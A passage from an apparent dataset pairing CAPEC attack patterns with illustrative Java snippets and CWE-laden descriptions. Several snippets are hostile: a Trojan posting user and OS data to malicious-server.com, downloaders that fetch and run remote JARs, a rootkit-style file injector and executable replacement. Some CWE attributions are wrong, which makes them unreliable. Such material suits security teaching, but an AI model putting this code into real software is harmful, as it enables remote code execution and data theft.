        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableDownloader {\n    public static void main(String[] args) {\n        String url = \"http://example.com/malicious-library.jar\";\n        String destination = \"./libs/malicious-library.jar\";\n        try {\n            downloadFile(url, destination);\n            Runtime.getRuntime().exec(\"java -jar \" + destination);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void downloadFile(String url, String destination) throws IOException {\n        try (BufferedInputStream in = new BufferedInputStream(new URL(url).openStream());\n             FileOutputStream fileOutputStream = new FileOutputStream(destination)) {\n            byte dataBuffer[] = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {\n                fileOutputStream.write(dataBuffer, 0, bytesRead);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable downloader that fetches a JAR file from a remote URL and executes it without verifying its integrity or origin. This embodies the CAPEC concept of 'Open-Source Library Manipulation' by showing how an adversary could implant malicious code in an open-source library, which is then downloaded and executed by the victim. The code is vulnerable to CWE-494 (Download of Code Without Integrity Check) and CWE-829 (Inclusion of Functionality from Untrusted Control Sphere), as it does not perform any checks on the downloaded file. This could lead to the execution of malicious code (CWE-506) and potentially allow the spread of replicating malicious code (CWE-509)."
    },
    {
        "capec_id": "539",
        "capec_name": "ASIC With Malicious Functionality",
        "code_snippet": "public class MaliciousASIC {\n    private static final String SECRET_KEY = \"hardcoded_secret_key\";\n    private static final boolean DEBUG = true;\n\n    public static void main(String[] args) {\n        if (DEBUG) {\n            System.out.println(\"Debug mode is ON. Sensitive information might be exposed.\");\n        }\n        // Malicious functionality: Exfiltrate sensitive information\n        exfiltrateSensitiveData();\n    }\n\n    private static void exfiltrateSensitiveData() {\n        // Simulate access to sensitive system information\n        String sensitiveData = \"Sensitive System Information\";\n        // Insecurely send sensitive data to an unauthorized control sphere\n        sendToAttacker(sensitiveData);\n    }\n\n    private static void sendToAttacker(String data) {\n        // Simulate sending data to an attacker\n        System.out.println(\"Sending data to attacker: \" + data);\n    }\n}",
        "description": "This Java code snippet represents the concept of an ASIC with malicious functionality. The code includes a hardcoded secret key (CWE-506: Embedded Malicious Code) and a debug mode that exposes sensitive information (CWE-11: ASP.NET Misconfiguration: Creating Debug Binary). The `exfiltrateSensitiveData` method simulates accessing and exfiltrating sensitive system information (CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere). The `sendToAttacker` method represents the malicious action of sending this sensitive data to an unauthorized entity. This snippet embodies the main idea of CAPEC-ASIC with Malicious Functionality by demonstrating how an attacker could insert malicious code into an ASIC to compromise the system."
    },
    {
        "capec_id": "540",
        "capec_name": "Overread Buffers",
        "code_snippet": "public class BufferOverreadExample {\n    public static void main(String[] args) {\n        String sensitiveData = \"SensitiveInformation\";\n        char[] buffer = new char[10];\n        \n        // Vulnerable code: reading beyond the buffer's boundary\n        for (int i = 0; i <= buffer.length; i++) {\n            buffer[i] = sensitiveData.charAt(i);\n        }\n        \n        // Print buffer content\n        System.out.println(buffer);\n    }\n}",
        "description": "This Java code snippet demonstrates a buffer over-read vulnerability. The 'sensitiveData' string contains more characters than the 'buffer' array can hold. The for-loop iterates from 0 to buffer.length (inclusive), which causes an out-of-bounds read when 'i' equals buffer.length. This results in an ArrayIndexOutOfBoundsException, which is a common symptom of CWE-125 (Out-of-bounds Read) and CWE-126 (Buffer Over-read). The code represents the main idea of CAPEC-129 (Overread Buffers) by showing how an adversary could exploit such a vulnerability to read beyond the intended buffer, potentially exposing sensitive information or causing a crash."
    },
    {
        "capec_id": "541",
        "capec_name": "Application Fingerprinting",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class FingerprintingExample {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                handleClient(clientSocket);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void handleClient(Socket clientSocket) {\n        try {\n            String response;\n            if (isVulnerableVersion()) {\n                response = \"HTTP/1.1 200 OK\\nServer: VulnerableApp/1.0\\n\\n\";\n            } else {\n                response = \"HTTP/1.1 200 OK\\nServer: SecureApp/2.0\\n\\n\";\n            }\n            clientSocket.getOutputStream().write(response.getBytes());\n            clientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean isVulnerableVersion() {\n        // Simulate a check for a vulnerable version\n        return true; // This would be dynamic in a real application\n    }\n}",
        "description": "This Java code snippet demonstrates a simple server that listens on port 8080 and responds to client requests. The server's response includes a 'Server' header that reveals the application version. This behavior can be exploited for application fingerprinting (CAPEC-170). The code also embodies CWE-204 (Observable Response Discrepancy) by providing different responses based on the application's version, which can be observed by an attacker. The 'isVulnerableVersion' method simulates a check for a vulnerable version, and the response changes accordingly, revealing internal state information."
    },
    {
        "capec_id": "542",
        "capec_name": "Targeted Malware",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class TargetedMalware {\n    public static void main(String[] args) {\n        try {\n            // CWE-507: Trojan Horse - disguised as a useful utility\n            System.out.println(\"Utility to check system status\");\n            checkSystemStatus();\n\n            // CWE-506: Embedded Malicious Code\n            String sensitiveInfo = getSensitiveSystemInfo();\n            sendSensitiveInfo(sensitiveInfo);\n\n            // CWE-509: Replicating Malicious Code\n            replicateMalware();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void checkSystemStatus() {\n        // Simulated system status check\n        System.out.println(\"System is running normally.\");\n    }\n\n    private static String getSensitiveSystemInfo() {\n        // CWE-497: Exposure of Sensitive System Information\n        return System.getProperty(\"os.name\") + \" \" + System.getProperty(\"user.name\");\n    }\n\n    private static void sendSensitiveInfo(String info) throws IOException {\n        // CWE-512: Spyware - sending collected information to an external server\n        URL url = new URL(\"http://malicious-server.com/collect\");\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"POST\");\n        conn.setDoOutput(true);\n        try (OutputStream os = conn.getOutputStream()) {\n            os.write(info.getBytes());\n            os.flush();\n        }\n    }\n\n    private static void replicateMalware() {\n        // Simulated replication logic\n        System.out.println(\"Replicating malware to other systems...\");\n    }\n}",
        "description": "This Java code snippet represents a targeted malware attack that leverages multiple weaknesses. The main function masquerades as a benign utility (CWE-507: Trojan Horse) to check system status. It then collects sensitive system information (CWE-497: Exposure of Sensitive System Information) and sends it to an external server (CWE-512: Spyware). Finally, it includes a placeholder for replicating the malware to other systems (CWE-509: Replicating Malicious Code). The code embodies the main idea of CAPEC-Targeted Malware by demonstrating how an adversary can craft malware based on specific information about the target environment to achieve various malicious objectives."
    },
    {
        "capec_id": "543",
        "capec_name": "Counterfeit Websites",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class CounterfeitWebsite {\n    public static void main(String[] args) {\n        try {\n            // CWE-601: Open Redirect\n            String redirectUrl = \"http://malicious-site.com\";\n            URL url = new URL(redirectUrl);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            // CWE-494: Download of Code Without Integrity Check\n            InputStream in = conn.getInputStream();\n            FileOutputStream out = new FileOutputStream(\"malicious_code.jar\");\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            in.close();\n            out.close();\n\n            // Execute the downloaded code (potentially CWE-506: Embedded Malicious Code)\n            Runtime.getRuntime().exec(\"java -jar malicious_code.jar\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of a counterfeit website that redirects users to a malicious site and downloads malicious code without verifying its integrity. The code first performs an open redirect (CWE-601) to a malicious URL. It then downloads a file from this URL without performing any integrity checks (CWE-494). Finally, it executes the downloaded file, which could contain embedded malicious code (CWE-506). This represents the main idea of the CAPEC 'Counterfeit Websites', where an adversary creates a duplicate of a legitimate website to gather information or upload malware."
    },
    {
        "capec_id": "544",
        "capec_name": "Counterfeit Organizations",
        "code_snippet": "import javax.net.ssl.HttpsURLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.URL;\nimport java.security.cert.Certificate;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"https://fake-supplier.com/api/data\"); // CWE-941: Incorrectly Specified Destination\n            HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            connection.connect();\n\n            Certificate[] certs = connection.getServerCertificates();\n            // CWE-295: Improper Certificate Validation\n            if (certs.length == 0 || !certs[0].toString().contains(\"CN=legitimate-supplier.com\")) {\n                System.out.println(\"Warning: Certificate validation failed.\");\n            }\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder content = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n\n            System.out.println(\"Received data: \" + content.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an application connects to a counterfeit supplier's URL (CWE-941: Incorrectly Specified Destination) and performs improper certificate validation (CWE-295: Improper Certificate Validation). The code attempts to validate the server's certificate but does so incorrectly by only checking if the certificate contains a specific string, which is not a secure validation method. This represents the CAPEC concept of 'Counterfeit Organizations,' where an adversary creates a fake supplier to inject malicious components into the supply chain. The code's improper handling of certificates and incorrect destination specification make it vulnerable to such attacks."
    },
    {
        "capec_id": "545",
        "capec_name": "Pull Data from System Resources",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class SensitiveDataExposure {\n    public static void main(String[] args) {\n        String filePath = \"/path/to/sensitive/file\";\n        try {\n            // Read sensitive data from a file\n            byte[] data = Files.readAllBytes(Paths.get(filePath));\n            System.out.println(\"Sensitive data: \" + new String(data));\n\n            // Simulate improper zeroization of sensitive data\n            clearSensitiveData(data);\n\n            // Simulate improper scrubbing of sensitive data\n            File file = new File(filePath);\n            if (file.delete()) {\n                System.out.println(\"File deleted, but data may still be recoverable.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void clearSensitiveData(byte[] data) {\n        // Improper zeroization: only setting the first byte to zero\n        if (data.length > 0) {\n            data[0] = 0;\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Pull Data from System Resources' (CAPEC) by reading sensitive data from a file and then improperly handling it. The code reads the contents of a file that is assumed to contain sensitive information and prints it to the console. It then attempts to clear the sensitive data by only zeroing out the first byte, which is an example of 'Improper Zeroization of Hardware Register' (CWE-1239). Finally, it deletes the file but does not ensure that the data is unrecoverable, illustrating 'Improper Scrubbing of Sensitive Data from Decommissioned Device' (CWE-1266). This code highlights the risks associated with improper handling and clearing of sensitive information in system resources."
    },
    {
        "capec_id": "546",
        "capec_name": "Incomplete Data Deletion in a Multi-Tenant Environment",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class IncompleteDataDeletion {\n    public static void main(String[] args) {\n        String tenantData = \"Sensitive Information\";\n        File file = new File(\"tenantData.txt\");\n\n        // Simulate writing sensitive data to a file\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(tenantData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // Simulate incomplete data deletion\n        if (file.delete()) {\n            System.out.println(\"File deleted, but data may still be recoverable.\");\n        } else {\n            System.out.println(\"Failed to delete the file.\");\n        }\n\n        // Simulate reallocation of resources to a new tenant\n        File newTenantFile = new File(\"tenantData.txt\");\n        if (newTenantFile.exists()) {\n            System.out.println(\"New tenant can access leftover data.\");\n        } else {\n            System.out.println(\"No leftover data accessible to new tenant.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of incomplete data deletion in a multi-tenant environment. The code writes sensitive information to a file and then attempts to delete the file. However, the deletion is simulated to be incomplete, representing a scenario where data may still be recoverable. The code then simulates the reallocation of resources to a new tenant, who can potentially access the leftover data. This example embodies the CAPEC of 'Incomplete Data Deletion in a Multi-Tenant Environment' and highlights related CWEs such as 'Improper Access Control' and 'Improper Scrubbing of Sensitive Data from Decommissioned Device'."
    },
    {
        "capec_id": "547",
        "capec_name": "Physical Destruction of Device or Component",
        "code_snippet": "public class Device {\n    private boolean isDestroyed = false;\n\n    public void destroy() {\n        // CWE-1082: Class Instance Self Destruction Control Element\n        isDestroyed = true;\n        System.out.println(\"Device is destroyed.\");\n    }\n\n    public void processData() {\n        if (isDestroyed) {\n            // CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component\n            System.out.println(\"Error: Device is destroyed. Data processing halted.\");\n            return;\n        }\n        // Simulate data processing\n        System.out.println(\"Processing data...\");\n    }\n\n    public void injectError() {\n        // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n        System.out.println(\"Error injected. Device redundancy compromised.\");\n    }\n\n    public static void main(String[] args) {\n        Device device = new Device();\n        device.processData();\n        device.injectError();\n        device.destroy();\n        device.processData();\n    }\n}",
        "description": "This Java code snippet represents a simplified model of a device that can be physically destroyed, embodying the main idea of the CAPEC 'Physical Destruction of Device or Component'. The 'Device' class includes methods to destroy the device (CWE-1082), process data with a check for destruction status (CWE-1301), and inject errors to compromise redundancy (CWE-1334). The 'main' method demonstrates the sequence of processing data, injecting an error, destroying the device, and attempting to process data again, highlighting the impact of physical destruction and error injection on the device's functionality."
    },
    {
        "capec_id": "548",
        "capec_name": "Contaminate Resource",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class ContaminateResourceExample {\n    public static void main(String[] args) {\n        try {\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            String sensitiveData = \"Sensitive Information\";\n            Socket socket = new Socket(\"example.com\", 80);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(sensitiveData); // Transmitting sensitive data in cleartext\n\n            // CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n            File file = new File(\"sensitiveData.txt\");\n            FileWriter writer = new FileWriter(file);\n            writer.write(sensitiveData); // Storing sensitive data without proper removal\n            writer.close();\n\n            // CWE-226: Sensitive Information in Resource Not Removed Before Reuse\n            RandomAccessFile raf = new RandomAccessFile(file, \"rw\");\n            raf.setLength(0); // Improperly clearing the file, data might still be recoverable\n            raf.close();\n\n            // CWE-922: Insecure Storage of Sensitive Information\n            File insecureFile = new File(\"insecureData.txt\");\n            FileWriter insecureWriter = new FileWriter(insecureFile);\n            insecureWriter.write(sensitiveData); // Storing sensitive data without access control\n            insecureWriter.close();\n\n            // CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak')\n            FileInputStream fis = new FileInputStream(insecureFile);\n            byte[] buffer = new byte[1024];\n            int bytesRead = fis.read(buffer);\n            while (bytesRead != -1) {\n                // Leaking sensitive data to an untrusted party\n                System.out.write(buffer, 0, bytesRead);\n                bytesRead = fis.read(buffer);\n            }\n            fis.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to the 'Contaminate Resource' CAPEC. The code transmits sensitive information in cleartext (CWE-319), stores sensitive data without proper removal (CWE-212), improperly clears sensitive data before reuse (CWE-226), stores sensitive data insecurely (CWE-922), and leaks sensitive data to an untrusted party (CWE-402). These actions can lead to contamination of organizational information systems, requiring them to be taken offline for investigation and mitigation, thus denying availability."
    },
    {
        "capec_id": "549",
        "capec_name": "Local Execution of Code",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"malicious.jar\");\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"malicious.jar\");\n            pb.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where malicious code is downloaded and executed on a local system, embodying the main idea of CAPEC-Local Execution of Code. The code first downloads a JAR file from a remote URL without performing any integrity checks (CWE-494). It then executes the downloaded JAR file, which could contain malicious functionality (CWE-829). This represents a significant security risk as it allows an adversary to install and execute potentially harmful code on the target system."
    },
    {
        "capec_id": "550",
        "capec_name": "Install New Service",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class InstallService {\n    public static void main(String[] args) {\n        String serviceName = \"MyService\";\n        String servicePath = \"C:\\\\path\\\\to\\\\service.exe\";\n        String registryKey = \"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\\" + serviceName;\n        String command = \"reg add \" + registryKey + \" /v ImagePath /t REG_EXPAND_SZ /d \" + servicePath + \" /f\";\n\n        try {\n            Process process = Runtime.getRuntime().exec(command);\n            process.waitFor();\n            System.out.println(\"Service installed successfully.\");\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary might install a new service on a Windows system by modifying the registry. The code constructs a command to add a new registry key under 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\' with the service name and path to the executable. It then executes this command using the Runtime.getRuntime().exec() method. This approach can be dangerous as it may exploit improper access control (CWE-284) by running with elevated privileges, potentially using default credentials (CWE-1392) or insecure defaults (CWE-1188). The code also highlights the risk of .NET misconfiguration (CWE-520) if the service is a .NET application running with elevated access."
    },
    {
        "capec_id": "551",
        "capec_name": "Modify Existing Service",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class ModifyService {\n    public static void main(String[] args) {\n        String serviceConfigPath = \"/etc/systemd/system/my-service.service\";\n        String maliciousConfig = \"[Service]\\nExecStart=/bin/malicious-script.sh\\n\";\n\n        try {\n            // CWE-284: Improper Access Control\n            Files.write(Paths.get(serviceConfigPath), maliciousConfig.getBytes());\n            System.out.println(\"Service configuration modified.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Modify Existing Service' by altering the configuration of a system service. The code attempts to write a malicious configuration to a service file, which could enable a malicious script to run when the service starts. This embodies CWE-284 (Improper Access Control) as it assumes the code has the necessary permissions to modify the service configuration. The code also indirectly touches on CWE-15 (External Control of System or Configuration Setting) by allowing external modification of a critical system configuration."
    },
    {
        "capec_id": "552",
        "capec_name": "Install Rootkit ",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class RootkitInstaller {\n    public static void main(String[] args) {\n        if (args.length != 2) {\n            System.out.println(\"Usage: java RootkitInstaller <target_file> <malicious_code>\");\n            return;\n        }\n\n        String targetFile = args[0];\n        String maliciousCode = args[1];\n\n        try {\n            // CWE-284: Improper Access Control\n            Files.setPosixFilePermissions(Paths.get(targetFile), PosixFilePermissions.fromString(\"rwxrwxrwx\"));\n\n            // CWE-78: OS Command Injection\n            String command = \"echo \" + maliciousCode + \" >> \" + targetFile;\n            Runtime.getRuntime().exec(command);\n\n            // CWE-506: Embedded Malicious Code\n            // CWE-507: Trojan Horse\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            System.out.println(\"Malicious code injected into \" + targetFile);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a rootkit installer. The program takes two arguments: the target file and the malicious code to be injected. It first sets the file permissions to be fully accessible (CWE-284: Improper Access Control). Then, it constructs and executes an OS command to append the malicious code to the target file (CWE-78: OS Command Injection). The injected code represents embedded malicious code (CWE-506) and a Trojan horse (CWE-507), as it appears benign but contains hidden malicious functionality. Finally, it prints a message indicating the injection, which could expose sensitive system information to unauthorized control (CWE-497). This code embodies the main idea of the CAPEC by demonstrating how an adversary might exploit authentication weaknesses to install a rootkit that alters system functionality and hides its presence."
    },
    {
        "capec_id": "554",
        "capec_name": "Functionality Bypass",
        "code_snippet": "import java.util.Scanner;\n\npublic class AuthenticationBypass {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter password: \");\n        String password = scanner.nextLine();\n\n        // Simulated server-side check\n        if (authenticate(username, password)) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n\n        // Vulnerable client-side check\n        System.out.print(\"Enter admin command: \");\n        String command = scanner.nextLine();\n        if (command.equals(\"admin\")) {\n            System.out.println(\"Admin access granted.\");\n        } else {\n            System.out.println(\"Admin access denied.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Simulated authentication logic\n        return \"admin\".equals(username) && \"password123\".equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a functionality bypass vulnerability. The main idea is that an adversary can bypass the intended protection mechanisms. The code includes a simulated server-side authentication check, but it also contains a vulnerable client-side check for admin commands. This client-side check can be easily bypassed by an attacker, representing CWE-602 (Client-Side Enforcement of Server-Side Security). The code snippet embodies the CAPEC concept by showing how an attacker can bypass protection mechanisms that are incorrectly implemented or insufficiently protected."
    },
    {
        "capec_id": "555",
        "capec_name": "Remote Services with Stolen Credentials",
        "code_snippet": "import java.io.*;\nimport java.net.*;\nimport java.util.Base64;\n\npublic class VulnerableRemoteService {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"example.com\", 22); // SSH port\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // CWE-522: Insufficiently Protected Credentials\n            String credentials = \"username:password\";\n            String encodedCredentials = Base64.getEncoder().encodeToString(credentials.getBytes());\n            out.println(\"AUTH \" + encodedCredentials);\n\n            // CWE-308: Use of Single-factor Authentication\n            // CWE-309: Use of Password System for Primary Authentication\n            String response = in.readLine();\n            if (\"OK\".equals(response)) {\n                System.out.println(\"Authenticated successfully\");\n                // Perform some remote operations\n            } else {\n                System.out.println(\"Authentication failed\");\n            }\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable remote service authentication mechanism. It connects to a remote server using a socket on the SSH port (22). The code uses Base64 encoding to transmit credentials, which is insecure (CWE-522: Insufficiently Protected Credentials). The authentication mechanism relies on single-factor authentication (CWE-308) and uses a password system as the primary means of authentication (CWE-309). This setup is susceptible to various attacks, including credential theft and replay attacks, aligning with the CAPEC description of 'Remote Services with Stolen Credentials'."
    },
    {
        "capec_id": "556",
        "capec_name": "Replace File Extension Handlers",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.FileAttribute;\n\npublic class FileHandlerModifier {\n    public static void main(String[] args) {\n        if (args.length != 2) {\n            System.out.println(\"Usage: java FileHandlerModifier <file-extension> <program-path>\");\n            return;\n        }\n\n        String fileExtension = args[0];\n        String programPath = args[1];\n\n        try {\n            // Simulate modifying the file handler for the given extension\n            Path handlerFile = Paths.get(\"C:\\\\Windows\\\\System32\\\\handlers\\\\\" + fileExtension + \".handler\");\n            Files.write(handlerFile, programPath.getBytes(), new FileAttribute<?>[0]);\n            System.out.println(\"File handler for \" + fileExtension + \" set to \" + programPath);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential vulnerability where an application modifies the file handler for a given file extension. The program takes two command-line arguments: a file extension and a program path. It then writes the program path to a simulated handler file for the given extension. This represents the CAPEC 'Replace File Extension Handlers' by showing how an application can change the file handler to call an arbitrary program when a file with the specified extension is opened. The code is vulnerable to CWE-284 (Improper Access Control) as it does not check permissions before modifying the handler, CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) as it relies on the file extension, and CWE-73 (External Control of File Name or Path) as it allows user input to control the file path."
    },
    {
        "capec_id": "557",
        "capec_name": "DEPRECATED: Schedule Software To Run",
        "code_snippet": "import java.util.Timer;\nimport java.util.TimerTask;\n\npublic class DeprecatedScheduler {\n    public static void main(String[] args) {\n        Timer timer = new Timer();\n        timer.schedule(new TimerTask() {\n            @Override\n            public void run() {\n                System.out.println(\"Task executed\");\n            }\n        }, 1000); // Schedule task to run after 1 second\n    }\n}",
        "description": "This Java code snippet demonstrates the use of the deprecated `Timer` and `TimerTask` classes to schedule a task to run after a delay of 1 second. The `Timer` class is considered obsolete and has been replaced by the `ScheduledExecutorService` in modern Java applications. This code embodies the main idea of the deprecated CAPEC 'Schedule Software To Run' by using an outdated method to schedule tasks. Additionally, it touches on CWE-477 (Use of Obsolete Function) by utilizing deprecated classes, and CWE-1101 (Reliance on Runtime Component in Generated Code) as the `Timer` class relies on the Java runtime environment to function correctly."
    },
    {
        "capec_id": "558",
        "capec_name": "Replace Trusted Executable",
        "code_snippet": "import java.nio.file.*;\nimport java.io.IOException;\n\npublic class ReplaceTrustedExecutable {\n    public static void main(String[] args) {\n        String trustedExecutablePath = \"/usr/bin/trustedExecutable\";\n        String maliciousExecutablePath = \"/tmp/maliciousExecutable\";\n\n        try {\n            // CWE-284: Improper Access Control - No access control checks\n            Files.copy(Paths.get(maliciousExecutablePath), Paths.get(trustedExecutablePath), StandardCopyOption.REPLACE_EXISTING);\n            System.out.println(\"Trusted executable replaced successfully.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        try {\n            // CWE-78: OS Command Injection - Executing the replaced executable\n            Runtime.getRuntime().exec(trustedExecutablePath);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Replace Trusted Executable' (CAPEC-Replace Trusted Executable). The code first copies a malicious executable from a temporary directory to replace a trusted executable in the system directory. This action exploits CWE-284 (Improper Access Control) by not performing any access control checks before replacing the file. After replacing the trusted executable, the code then executes it, which could lead to the execution of malicious code, demonstrating CWE-78 (OS Command Injection). The code highlights the risk of not properly securing access to critical system files and the potential for executing malicious code if those files are tampered with."
    },
    {
        "capec_id": "559",
        "capec_name": "Orbital Jamming",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class SatelliteJamming {\n    private static final int PORT = 9876;\n    private static final String TARGET_IP = \"192.168.1.100\";\n\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            byte[] buffer = new byte[1024];\n            InetAddress targetAddress = InetAddress.getByName(TARGET_IP);\n\n            // Simulate jamming by sending disruptive signals\n            for (int i = 0; i < 1000; i++) {\n                String disruptiveMessage = \"JAMMING_SIGNAL\" + i;\n                buffer = disruptiveMessage.getBytes();\n                DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, PORT);\n                socket.send(packet);\n            }\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic simulation of an orbital jamming attack. The code uses a DatagramSocket to send disruptive signals to a target IP address, representing a satellite. The loop sends multiple packets with disruptive messages to the target, simulating the jamming of the satellite's communication channel. This embodies the main idea of the CAPEC 'Orbital Jamming' by showing how an adversary might disrupt satellite communications. The code also touches on related CWEs by not verifying the source of the communication (CWE-940) and not ensuring message integrity (CWE-924), which are common weaknesses in such attacks."
    },
    {
        "capec_id": "560",
        "capec_name": "Use of Known Domain Credentials",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\nimport java.util.Scanner;\n\npublic class VulnerableAuthSystem {\n    private static Map<String, String> userDatabase = new HashMap<>();\n\n    static {\n        // Storing credentials in plain text (CWE-522)\n        userDatabase.put(\"user1\", \"password123\");\n        userDatabase.put(\"user2\", \"password456\");\n    }\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter password: \");\n        String password = scanner.nextLine();\n\n        if (authenticate(username, password)) {\n            System.out.println(\"Authentication successful!\");\n        } else {\n            System.out.println(\"Authentication failed!\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Single-factor authentication (CWE-308)\n        return userDatabase.containsKey(username) && userDatabase.get(username).equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable authentication system that embodies the main idea of CAPEC-Use of Known Domain Credentials. The code stores user credentials in plain text (CWE-522), uses single-factor authentication (CWE-308), and does not implement any measures to prevent multiple failed authentication attempts (CWE-307). The `authenticate` method checks the username and password against a hardcoded user database, which is a common security flaw. This example highlights the risks associated with using known domain credentials and the importance of implementing stronger authentication mechanisms."
    },
    {
        "capec_id": "561",
        "capec_name": "Windows Admin Shares with Stolen Credentials",
